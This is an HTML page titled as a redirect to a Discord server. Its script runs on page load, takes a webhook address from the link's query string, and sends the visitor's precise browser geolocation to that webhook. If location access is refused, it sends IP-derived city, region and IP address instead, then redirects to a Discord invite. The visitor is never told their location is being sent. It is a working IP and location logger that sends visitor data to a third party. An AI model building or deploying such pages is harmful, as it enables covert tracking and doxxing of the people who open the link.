<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect to Discord and Send Location</title>
</head>
<body>
    <script>
        // Function to extract the 'webhook' parameter from the URL
        function getWebhookFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('webhook');
        }

        // Function to send data to the provided webhook
        function sendToWebhook(webhookUrl, message) {
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: message })
            }).then(response => {
                if (response.ok) {
                    console.log("Message sent to webhook successfully!");
                } else {
                    console.error("Failed to send message to webhook.");
                }
            }).catch(error => {
                console.error("Error sending message:", error);
            });
        }

        // Function to fetch approximate location using the user's IP
        function getApproxLocation() {
            fetch("https://ipinfo.io/json?token=YOUR_IPINFO_API_KEY")  // Replace with your ipinfo.io token
                .then(response => response.json())
                .then(data => {
                    const locationMessage = `IP-based location: City: ${data.city}, State: ${data.region}, IP: ${data.ip}`;
                    sendToWebhook(getWebhookFromUrl(), locationMessage);
                })
                .catch(error => {
                    console.error("Error fetching IP location:", error);
                    // Fallback if IP lookup fails
                    sendToWebhook(getWebhookFromUrl(), "Unable to determine location.");
                });
        }

        // Main function to handle geolocation and webhook sending
        function handleRedirectAndWebhook() {
            // Get the webhook URL from the query string
            const webhookUrl = getWebhookFromUrl();

            // Check if webhook is available
            if (webhookUrl) {
                // Get the location (if available)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;

                        // Use the browser to fetch a more detailed address
                        const geoDetailsMessage = `User's precise location: Latitude: ${latitude}, Longitude: ${longitude}`;

                        // Send precise location data to the webhook
                        sendToWebhook(webhookUrl, geoDetailsMessage);

                        // Redirect to the Discord invite link
                        window.location.href = "https://discord.gg/perkbios";
                    }, function(error) {
                        console.error("Geolocation error:", error);
                        // If the user denies location, fall back to IP-based location
                        getApproxLocation();

                        // Redirect to Discord even if geolocation is denied
                        window.location.href = "https://discord.gg/perkbios";
                    });
                } else {
                    console.log("Geolocation is not supported by this browser.");
                    // Fall back to IP-based location if geolocation is not supported
                    getApproxLocation();

                    // Redirect to Discord if geolocation is not supported
                    window.location.href = "https://discord.gg/perkbios";
                }
            } else {
                console.error("No webhook URL found in the query string.");
            }
        }

        // Call the main function when the page loads
        handleRedirectAndWebhook();
    </script>
</body>
</html>
